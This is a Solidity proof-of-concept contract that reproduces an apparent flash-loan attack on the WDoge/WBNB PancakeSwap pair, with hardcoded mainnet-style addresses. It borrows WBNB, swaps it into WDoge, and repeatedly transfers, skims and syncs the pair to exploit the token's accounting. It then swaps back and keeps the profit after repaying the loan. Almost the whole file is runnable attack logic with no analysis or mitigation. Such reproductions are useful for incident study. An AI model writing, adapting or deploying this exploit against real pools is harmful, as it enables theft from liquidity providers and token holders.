// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";

interface IDDPA_flashloan{
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}


contract wdoge_poc{
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;                      //flashloan 2900000000000000000000
    address public constant DPPAdvanced = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;               //flashloan wbnb
    address public constant WDoge = 0x46bA8a59f4863Bd20a066Fd985B163235425B5F9;
    address public constant WDoge_WBNB_pair = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;           //swap   (token0: wdoge,   token1: wbnb)


    function set_approve_token() public {
        // IERC20().approve(spender, amount);
    }

    function flashloan_from_DDAP() public {
        console.log("ddap flash loan start...");

        bytes memory _data = "ddap flash loan start...";
        uint256 baseAmount = 2900000000000000000000;
        uint256 quoteAmount = 0;
        IDDPA_flashloan(DPPAdvanced).flashLoan(baseAmount, quoteAmount, address(this), _data);

        // console.log("now I have WDoge: ", IERC20(WDoge).balanceOf(address(this)));
        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender,uint256 baseAmount,uint256 quoteAmount,bytes calldata data) external {
        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        console.log("flashloan logical ways...");

        swap_pancake1();

        console.log("Then transfer WDoge to pancake pair...");
        uint256 transfer_amount1 = 5532718068557297916520398869451;
        IERC20(WDoge).transfer(WDoge_WBNB_pair, transfer_amount1);

        skim_pancake();

        console.log("Transfer WDoge to pancake pair...");
        uint256 transfer_amount2 = 4466647961091568568393910837883;
        IERC20(WDoge).transfer(WDoge_WBNB_pair, transfer_amount2);
        console.log("now I have WDoge: ", IERC20(WDoge).balanceOf(address(this)));

        swap_pancake2();

        IERC20(WBNB).transfer(DPPAdvanced, 2900000000000000000000);     //return flashloan
        console.log("flashloan returned...");
    }

    function swap_pancake1() public {
        console.log("Fisrt swap to pancake...");
        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(WDoge_WBNB_pair).getReserves();
        console.log("reserve0 and reserve1 : ", reserve0, reserve1);

        IERC20(WBNB).transfer(WDoge_WBNB_pair, IERC20(WBNB).balanceOf(address(this)));
        
        uint256 amount0Out = 6638066501837822413045167240755;
        uint256 amount1Out = 0;
        bytes memory data = "";
        UniswapV2Pair(WDoge_WBNB_pair).swap(amount0Out, amount1Out, address(this), data);
        
        console.log("now I have WDoge: ", IERC20(WDoge).balanceOf(address(this)));
        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
    }

    function swap_pancake2() public {
        console.log("Second swap to pancake...");

        uint256 amount0Out = 0;
        uint256 amount1Out = 2978658352619485704640;
        bytes memory data = "";
        UniswapV2Pair(WDoge_WBNB_pair).swap(amount0Out, amount1Out, address(this), data);
        
        console.log("now I have WDoge: ", IERC20(WDoge).balanceOf(address(this)));
        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
    }

    function skim_pancake() public {
        console.log("pancake skim to me...");
        UniswapV2Pair(WDoge_WBNB_pair).skim(address(this));                     //skim is
        console.log("now I have WDoge: ", IERC20(WDoge).balanceOf(address(this)));
        UniswapV2Pair(WDoge_WBNB_pair).sync();
        console.log("sync complete...");
    }
}